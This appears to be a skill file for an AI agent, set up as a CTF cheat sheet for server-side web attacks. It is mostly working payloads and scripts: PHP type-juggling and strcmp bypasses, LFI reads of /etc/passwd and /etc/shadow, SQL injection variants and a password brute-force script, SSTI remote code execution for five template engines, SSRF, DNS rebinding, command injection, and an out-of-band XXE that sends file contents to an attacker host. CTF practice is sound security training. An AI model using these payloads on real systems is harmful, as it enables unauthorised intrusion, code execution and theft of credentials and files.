---
name: web-server-side
description: "CTF web server-side injection attacks. PHP type juggling, LFI/php://filter, SQL injection (backslash escape, hex, second-order, LIKE brute-force, column truncation, SQLi-to-SSTI), SSTI (Jinja2, Go, EJS, ERB, Mako, Twig), SSRF, XXE, command injection, Host Header SSRF, DNS rebinding. Triggers: 'ctf web', 'server side injection', 'php type juggling', 'php lfi', 'ssti jinja2', 'sql injection ctf', 'xxe ctf', 'ssrf ctf', 'command injection ctf', 'web ctf'."
---

# CTF Web: Server-Side Injection Attacks

PHP type juggling, LFI/filter chains, SQLi variants, SSTI multi-engine, SSRF, XXE, command injection.

---

## PHP Type Juggling

```bash
# Loose comparison (==) bypass:
# 0 == "any_non_numeric_string" → true
# "0e123" == "0e456" → true (both 0 in scientific notation)

# Magic hash values (MD5):
# md5("240610708")  = "0e462097431906509019562988736854"
# md5("QNKCDZO")   = "0e830400451993494058024219903391"

# Exploit: send integer 0 via JSON (bypasses strcmp/==):
curl -X POST http://TARGET/login \
  -H 'Content-Type: application/json' \
  -d '{"password": 0}'

# Array bypass for strcmp():
# strcmp(array, string) returns NULL → if(!strcmp(...)) passes
curl http://TARGET/login -d 'password[]=anything'

# Test loose comparison auth bypass:
curl -X POST http://TARGET/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin", "password": "0"}'
```

---

## PHP File Inclusion / php://filter

```bash
TARGET="http://TARGET"

# Source code disclosure (base64 prevents execution):
curl "$TARGET/?page=php://filter/convert.base64-encode/resource=config" | base64 -d
curl "$TARGET/?page=php://filter/convert.base64-encode/resource=index" | base64 -d
curl "$TARGET/?page=php://filter/convert.base64-encode/resource=../config"

# Common LFI targets:
LFI_TARGETS=(
  "php://filter/convert.base64-encode/resource=index"
  "php://filter/convert.base64-encode/resource=../config"
  "../../../../etc/passwd"
  "../../../../etc/shadow"
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/var/log/apache2/access.log"
)

for t in "${LFI_TARGETS[@]}"; do
  echo "=== $t ==="
  curl -s "$TARGET/?page=$t" | base64 -d 2>/dev/null | head -5 || curl -s "$TARGET/?page=$t" | head -5
done

# Null byte bypass (PHP < 5.3.4):
curl "$TARGET/?page=../../../../etc/passwd%00"
```

---

## SQL Injection

### Backslash Escape Quote Bypass

```bash
# Query: WHERE username='$user' AND password='$pass'
# username=\ escapes the quote → username='\' AND password='INJECT'
curl -X POST http://TARGET/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://TARGET/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

### Hex Encoding (Quote Bypass)

```bash
# No quotes needed via hex:
# 0x666c6167 = "flag" 
python3 -c "print('0x' + 'flag'.encode().hex())"

# Hex-encoded SSTI payload via UNION:
python3 -c "
payload = '{{self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"/readflag\").read()}}'
print('0x' + payload.encode().hex())
"
# Use: username=asd\&password=) union select 1, 0x<HEX>#
```

### Second-Order SQL Injection

```python
import requests
s = requests.Session()

# Store payload in username during registration:
s.post("https://TARGET/register", data={
    "username": "' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a",
    "password": "anything"
})

# Login and trigger via profile view / password change:
s.post("https://TARGET/login", data={"username": <above>, "password": "anything"})
# Then view profile: triggers stored injection
```

### SQLi LIKE Brute-Force

```python
import requests, string

TARGET = "http://TARGET/login"
password = ""
for pos in range(50):
    for ch in string.printable:
        payload = f"' OR password LIKE '{password}{ch}%' --"
        r = requests.post(TARGET, data={"username": "admin", "password": payload})
        if "welcome" in r.text.lower():
            password += ch
            break
print(f"Password: {password}")
```

### MySQL Column Truncation

```bash
# VARCHAR(20) → pad "admin" with spaces to exceed column width
# MySQL truncates + ignores trailing spaces in = comparison
curl -X POST http://TARGET/register \
  -d 'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'
# Now login as admin with attacker password:
curl -X POST http://TARGET/login -d 'login=admin&password=attacker123'
```

### WAF Bypass via XML Hex Entities

```xml
<!-- UNION/SELECT blocked by WAF → use XML hex entity encoding: -->
<storeId>
  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
</storeId>
<!-- Decodes to: 1 UNION SELECT username FROM users -->
```

---

## SSTI

### Jinja2 (Python)

```python
# Detection: {{7*7}} → 49, {{7*'7'}} → 7777777 (Jinja2 specific)
# RCE:
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# No quotes:
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask:
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Mako (Python)

```python
# Detection: ${7*7} → 49
# RCE:
${__import__('os').popen('cat /flag.txt').read()}
<%
  import os
  x = os.popen("cat /flag").read()
%>
${x}
```

### Twig (PHP)

```twig
{# Detection: {{7*7}} → 49, {{7*'7'}} → 7777777 (string repeat = Twig) #}
{# RCE Twig 1.x: #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{# RCE Twig 3.x: #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

### ERB (Ruby)

```ruby
# Detection: <%= 7*7 %> → 49
# RCE:
<%= `cat /flag.txt` %>
<%= system("id") %>
# DB bypass via Sequel: DATABASES:
<%= Sequel: DATABASES.first[:users].all %>
```

### EJS (Node.js)

```javascript
// RCE in EJS:
<%- global.process.mainModule.require('child_process').execSync('cat /flag').toString() %>
```

### Go Template

```go
// Read file:
{{.ReadFile "/flag.txt"}}
```

### SSTI Quote Filter Bypass (Jinja2, ApoorvCTF)

```python
# No quotes allowed → use keyword args (no string literals):
{{player.__dict__.update(power_level=9999999) or player.name}}
```

---

## SSRF

```bash
# Host Header SSRF:
curl -H "Host: attacker.ngrok-free.app" https://TARGET/api/secret-object

# DNS Rebinding (TOCTOU):
curl -X POST TARGET/register -d '{"url": "http://7f000001.external_ip.rbndr.us:5001/flag"}'

# Curl redirect chain bypass (max redirects exceeded → unvalidated request):
# Chain redirects: attacker.com → attacker.com → ... → internal:80/admin
```

---

## XXE

```xml
<!-- Basic: -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- OOB XXE: host evil.dtd: -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER/flag?b64=%file;'>">
%eval; %exfil;

<!-- Trigger: -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ATTACKER/evil.dtd"> %xxe;]>
<root/>
```

---

## Command Injection

```bash
# Newline bypass:
curl -X POST http://TARGET/ --data-urlencode "ip=127.0.0.1%0acat%20flag.txt"

# Semicolons/backticks:
curl http://TARGET/ -d "host=127.0.0.1;id"
curl http://TARGET/ -d "host=127.0.0.1\`id\`"

# Bypass "cat/head/less blocked":
sed -n p flag.txt
awk '{print}' flag.txt
tac flag.txt
strings flag.txt

# Sendmail CGI injection:
# mail=' -bp|cat SECRETS/file #

# SQLi via EXIF injection:
exiftool -Comment="' UNION SELECT flag FROM flags--" image.jpg
# Then upload image to endpoint that reads EXIF
```

---

## DNS Rebinding Attack

```python
import requests

TARGET = "http://TARGET"

# Register webhook with rebinding domain:
rebind_url = "http://7f000001.YOUR_IP.rbndr.us:5001/flag"
r = requests.post(f"{TARGET}/register", json={"url": rebind_url})
webhook_id = r.json()["id"]

# Trigger: first DNS resolve = YOUR_IP (allowed), second = 127.0.0.1 (internal)
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

---

## Output

Save to `.omop/engagement/ctf/web/`:
- `sqli-payloads.txt`: working SQL injection payloads
- `ssti-payload.txt`: working SSTI payload and engine
- `lfi-sources.txt`: PHP source code extracted
- `xxe-exfil.txt`: XXE output

## Next Phase

→ `ctf-web-advanced` for deserialization, prototype pollution, race conditions
→ `ctf-exploit` for binary exploitation if web → RCE chain needed
